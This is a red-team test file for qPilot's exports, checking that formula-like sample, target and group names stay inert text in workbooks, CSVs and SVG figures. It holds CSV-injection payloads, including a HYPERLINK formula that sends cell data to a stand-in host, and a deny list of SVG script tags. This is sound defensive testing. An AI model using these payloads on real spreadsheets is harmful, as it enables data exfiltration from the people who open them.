"""Red team (excellence round): names from a lab's file in every file qPilot writes for a person.

A sample and a target whose names start with a minus (``-KO(2)``, ``-Mar1``: qPilot's name rule
keeps them, and a spreadsheet reads them as formulas, or shows ``#NAME?`` for a "-RT" control)
and a group named ``-HYPERLINK(A1)`` travel from the RDML into the workbook, the CSV tables, the
figures (SVG), the supplement, the repeat plate and the CLI's quantities CSV. In each, a name
must stay text: no ``.xlsx`` cell is a formula, no CSV text cell starts with ``=``, ``+``,
``-``, ``@``, a tab or a carriage return (a leading apostrophe defuses it, OWASP's CSV-injection
rule), and an SVG carries no element or attribute a name brought in. The mini file is walked
once for the module, with the target called down and an early no-template control (so the
repeat plan has items).

Findings (``docs/security-review-2026-10.md``): RT-EX-002, the CLI's quantities CSV wrote names
as they were; RT-EX-003, a group name the exports refuse made the figure routes a 500. The
rest passed when it was written, and stays so.
"""

from __future__ import annotations

import csv
import io
import shutil
import zipfile
from collections.abc import Iterator
from pathlib import Path
from typing import Any

import pytest
from fastapi.testclient import TestClient
from lxml import etree

from tests.web.conftest import BASE, TOKEN, wait_job

# A sample and a target as qPilot's name rule keeps them (letters, digits, ``_ - . ( )``: a
# minus first is a formula in a spreadsheet, and "-RT" is how many labs name a no-RT control),
# and a group named so too (an export refuses other characters in a group's name).
EVIL_SAMPLE = "-KO(2)"
EVIL_TARGET = "-Mar1"
EVIL_GROUP = "-HYPERLINK(A1)"
FORMULA_START = ("=", "+", "-", "@", "\t", "\r")
GROUPS = {"WT_1": "WT", "WT_2": "WT", "KO_1": EVIL_GROUP, EVIL_SAMPLE: EVIL_GROUP}


def _walk(studio, rdml: Path, groups: dict[str, str] = GROUPS) -> tuple[str, str]:
    from qpilot.mcp_server import QpilotTools

    tools = QpilotTools(studio.store)
    sid = studio.open(rdml)
    studio.propose_design(sid)
    for sample, group in groups.items():
        tools.qpcr_propose(sid, "design.group", sample, {"group": group})
    for p in studio.inbox(sid, "design", "proposed"):
        studio.accept(sid, p.id, "human", "checked")
    comparison = studio.propose_comparison(sid)
    studio.accept(sid, comparison.proposal.id, "human", "WT is the reference")
    for stage in ("design", "curves"):
        if stage == "curves":
            studio.propose_curves(sid)
            for p in studio.inbox(sid, "curves", "proposed"):
                studio.accept(sid, p.id, "human", "checked")
        confirm = studio.propose_confirm(sid, stage)
        studio.accept(sid, confirm.proposal.id, "human")
    return sid, studio.study(sid)


@pytest.fixture(scope="module")
def hostile_walked(tmp_path_factory) -> dict[str, Any]:
    """The mini file with a formula-like sample and target, walked to results once."""
    from qpilot.ai.client import ModelClient, NoneBackend
    from qpilot.core.store import StudyStore
    from qpilot.qpcr import design_checks
    from qpilot.qpcr import inspect as qinspect
    from qpilot.studio_service import Studio
    from tests.fixtures.studio import studio_mini

    base = tmp_path_factory.mktemp("hostile")
    root = base / "data"
    root.mkdir()
    with pytest.MonkeyPatch.context() as mp:
        mp.setenv("QPILOT_DATA_ROOTS", str(root))
        mp.setenv("QPILOT_STUDIES_DIR", str(base / "studies"))
        plate = dict(studio_mini.PLATES["1-Mar"])
        plate.update(NTC=[None, None, 30.5], KO_1=[28.0, 28.1, 27.9], KO_2=[28.2, 28.3, 28.1])
        mp.delitem(studio_mini.PLATES, "1-Mar")
        mp.setitem(studio_mini.PLATES, EVIL_TARGET, plate)
        mp.delitem(studio_mini.TARGETS, "1-Mar")
        mp.setitem(studio_mini.TARGETS, EVIL_TARGET, "toi")
        qinspect.clear_cache()
        rdml = studio_mini.write_studio_mini(root / "mini.rdml", rename={"KO_2": EVIL_SAMPLE})
        studio = Studio(StudyStore(base / "studies"), client=ModelClient(backend=NoneBackend()))
        sid, study_id = _walk(studio, rdml)
        design_checks._DECLARED.clear()
        design_checks.set_input_resolver(None)
        qinspect.clear_cache()
    return {"base": base, "root": root, "sid": sid, "study": study_id}


@pytest.fixture
def hostile(hostile_walked, tmp_path, monkeypatch) -> Iterator[dict[str, Any]]:
    from qpilot.ai.client import ModelClient, NoneBackend
    from qpilot.core.store import StudyStore
    from qpilot.qpcr import design_checks
    from qpilot.qpcr import inspect as qinspect
    from qpilot.studio_service import Studio
    from qpilot.web.context import make_context
    from qpilot.web.routers import evidence as evidence_router
    from qpilot.web.server import create_app

    shutil.copytree(hostile_walked["base"], tmp_path / "w", symlinks=False)
    monkeypatch.setenv("QPILOT_DATA_ROOTS", str(hostile_walked["root"]))
    monkeypatch.setenv("QPILOT_STUDIES_DIR", str(tmp_path / "w" / "studies"))
    qinspect.clear_cache()
    evidence_router.clear()
    store = StudyStore(tmp_path / "w" / "studies")
    studio = Studio(store, client=ModelClient(backend=NoneBackend()))
    ctx = make_context(store, studio, token=TOKEN, watch=False)
    with TestClient(create_app(ctx), base_url=BASE) as c:
        c.headers["x-qpilot-token"] = TOKEN
        c.headers["origin"] = BASE
        yield {"client": c, "store": store, "studio": studio, **hostile_walked}
    ctx.close()
    evidence_router.clear()
    design_checks._DECLARED.clear()
    design_checks.set_input_resolver(None)
    qinspect.clear_cache()


def _export(c: TestClient, study: str, fmt: str, **body: Any) -> bytes:
    r = c.post(f"/api/studies/{study}/report/export", json={"format": fmt, **body})
    assert r.status_code == 202, r.text
    job = wait_job(c, r.json()["job"])
    assert job["status"] == "done", job
    data = c.get(job["result"]["download"]["url"])
    assert data.status_code == 200
    return data.content


def _number(text: str) -> bool:
    try:
        float(text)
    except ValueError:
        return False
    return True


def _live_cells(text: str) -> list[str]:
    """CSV cells a spreadsheet would run as a formula (numbers such as ``-0.5`` are numbers)."""
    rows = csv.reader(io.StringIO(text.removeprefix("﻿")))
    return [v for row in rows for v in row if v.startswith(FORMULA_START) and not _number(v)]


def _assert_csv_defused(name: str, text: str) -> None:
    live = _live_cells(text)
    assert not live, f"{name}: cells that would run as formulas: {live[:3]}"


def _zip_csvs(data: bytes) -> dict[str, str]:
    with zipfile.ZipFile(io.BytesIO(data)) as z:
        return {n: z.read(n).decode("utf-8") for n in z.namelist() if n.endswith(".csv")}


def test_the_names_reach_the_study(hostile):
    """The walk really carries both names (else every check below would pass vacuously)."""
    c, study = hostile["client"], hostile["study"]
    data = _export(c, study, "csv")
    joined = "".join(_zip_csvs(data).values())
    assert EVIL_SAMPLE in joined and EVIL_TARGET in joined and EVIL_GROUP in joined


def test_no_workbook_cell_is_a_formula(hostile):
    import openpyxl

    c, study = hostile["client"], hostile["study"]
    data = _export(c, study, "xlsx")
    book = openpyxl.load_workbook(io.BytesIO(data), data_only=False)
    formulas = [
        (sheet.title, cell.coordinate, cell.value)
        for sheet in book.worksheets
        for row in sheet.iter_rows()
        for cell in row
        if cell.data_type == "f"
    ]
    assert not formulas, formulas[:3]
    texts = {str(cell.value) for s in book.worksheets for row in s.iter_rows() for cell in row}
    assert EVIL_SAMPLE in texts and EVIL_TARGET in texts and EVIL_GROUP in texts  # as text


def test_every_csv_table_is_defused(hostile):
    c, study = hostile["client"], hostile["study"]
    for name, text in _zip_csvs(_export(c, study, "csv")).items():
        _assert_csv_defused(name, text)


def test_the_figures_carry_names_only_as_text(hostile):
    c, study = hostile["client"], hostile["study"]
    data = _export(c, study, "figures")
    with zipfile.ZipFile(io.BytesIO(data)) as z:
        svgs = {n: z.read(n) for n in z.namelist() if n.endswith(".svg")}
        csvs = {n: z.read(n).decode("utf-8") for n in z.namelist() if n.endswith(".csv")}
    assert svgs, "no figure was drawn"
    for name, raw in svgs.items():
        root = etree.fromstring(raw, etree.XMLParser(resolve_entities=False, no_network=True))
        tags = {etree.QName(e).localname for e in root.iter() if isinstance(e.tag, str)}
        assert not tags & {"script", "foreignObject", "a", "b", "iframe", "image", "use"}, name
        handlers = [k for e in root.iter() for k in e.attrib if k.lower().startswith("on")]
        assert not handlers, (name, handlers)
    for name, text in csvs.items():
        _assert_csv_defused(name, text)


def test_one_figure_file_is_text_too(hostile):
    c, study = hostile["client"], hostile["study"]
    params = {"gene": EVIL_TARGET, "format": "svg"}
    r = c.get(f"/api/studies/{study}/report/figure", params=params)
    assert r.status_code == 200, r.text
    assert r.headers["content-security-policy"].startswith("default-src 'self'")
    assert b"<script" not in r.content
    name = r.headers["content-disposition"].split("filename=", 1)[1]
    assert "/" not in name and '"' not in name.strip('"') and ";" not in name
    r = c.get(f"/api/studies/{study}/report/figure", params={**params, "format": "csv"})
    _assert_csv_defused("figure source", r.text)


def test_the_supplement_is_defused(hostile):
    import openpyxl

    c, study = hostile["client"], hostile["study"]
    data = _export(c, study, "supplement")
    with zipfile.ZipFile(io.BytesIO(data)) as z:
        names = z.namelist()
        for name in names:
            if name.endswith(".csv"):
                _assert_csv_defused(name, z.read(name).decode("utf-8"))
            if name.endswith(".xlsx"):
                book = openpyxl.load_workbook(io.BytesIO(z.read(name)), data_only=False)
                cells = [c for s in book.worksheets for row in s.iter_rows() for c in row]
                assert not [c.coordinate for c in cells if c.data_type == "f"], name
    assert any(n.endswith(".xlsx") for n in names)


def test_the_repeat_plate_never_writes_a_live_cell(hostile):
    """The repeat plate (the planner's CSV) takes only names its layout rule allows.

    That rule (``layout.SAFE_NAME``: the engine's safe names, never starting with ``-``) keeps
    every formula start out, so a minus-first sample is listed but not laid out, in words.
    """
    c, study = hostile["client"], hostile["study"]
    for _ in range(200):
        r = c.get(f"/api/studies/{study}/review/repeat", params={"include": "all"})
        if r.status_code == 409 and r.json()["error"]["code"] == "loading":
            wait_job(c, r.json()["error"]["details"]["job"])
            continue
        assert r.status_code == 200, r.text
        break
    plan = r.json()["plan"]
    assert any(i["sample"] == EVIL_SAMPLE for i in plan["items"])
    r = c.get(f"/api/studies/{study}/review/repeat.csv", params={"include": "all"})
    if plan["wells"]:
        assert r.status_code == 200
        _assert_csv_defused("repeat.csv", r.text)
    else:
        assert r.status_code == 404
        assert any("cannot go into a plate layout" in w for w in plan["warnings"])


# RT-EX-002
def test_the_cli_quantities_csv_is_defused(tmp_path):
    from types import SimpleNamespace

    from qpilot.cli.quant_cmds import _write_csv

    unit = SimpleNamespace(
        unit=EVIL_GROUP,
        target=EVIL_TARGET,
        samples=[EVIL_SAMPLE],
        n_wells=3,
        n_detected=3,
        mean_cq=-1.5,
        quantity=10.0,
        low=5.0,
        high=20.0,
        curves=["-std"],
        flags=(),
    )
    out = tmp_path / "q.csv"
    try:
        _write_csv(out, SimpleNamespace(unknowns=[unit], unit="copies"))
    except AttributeError as err:  # the writer reads a field this stand-in lacks
        pytest.fail(f"stand-in out of date: {err}")
    _assert_csv_defused("quantities.csv", out.read_text(encoding="utf-8"))


# RT-EX-003
def test_a_group_the_exports_cannot_name_is_said_in_words_not_a_500(tmp_path, monkeypatch):
    """A group named with a character the exports refuse (``=`` here) gives the figure routes
    a refusal in words (409), never "something went wrong inside qPilot" (500)."""
    from qpilot.ai.client import ModelClient, NoneBackend
    from qpilot.core.store import StudyStore
    from qpilot.qpcr import design_checks
    from qpilot.qpcr import inspect as qinspect
    from qpilot.studio_service import Studio
    from qpilot.web.context import make_context
    from qpilot.web.server import create_app
    from tests.fixtures.studio.studio_mini import write_studio_mini

    root = tmp_path / "data"
    root.mkdir()
    monkeypatch.setenv("QPILOT_DATA_ROOTS", str(root))
    monkeypatch.setenv("QPILOT_STUDIES_DIR", str(tmp_path / "studies"))
    qinspect.clear_cache()
    rdml = write_studio_mini(root / "mini.rdml")
    store = StudyStore(tmp_path / "studies")
    studio = Studio(store, client=ModelClient(backend=NoneBackend()))
    bad = '=HYPERLINK("http://x.invalid/?"&A1,"open")'
    groups = {"WT_1": "WT", "WT_2": "WT", "KO_1": bad, "KO_2": bad}
    try:
        _, study = _walk(studio, rdml, groups)
        ctx = make_context(store, studio, token=TOKEN, watch=False)
        with TestClient(create_app(ctx), base_url=BASE) as c:
            c.headers["x-qpilot-token"] = TOKEN
            for route in ("report/figure/info", "report/figure"):
                r = c.get(f"/api/studies/{study}/{route}", params={"gene": "1-Mar"})
                assert r.status_code == 409, (route, r.status_code, r.text[:200])
                assert r.json()["error"]["code"] == "no_figure"
                assert "HYPERLINK" not in r.text  # the name is not echoed
        ctx.close()
    finally:
        design_checks._DECLARED.clear()
        design_checks.set_input_resolver(None)
        qinspect.clear_cache()
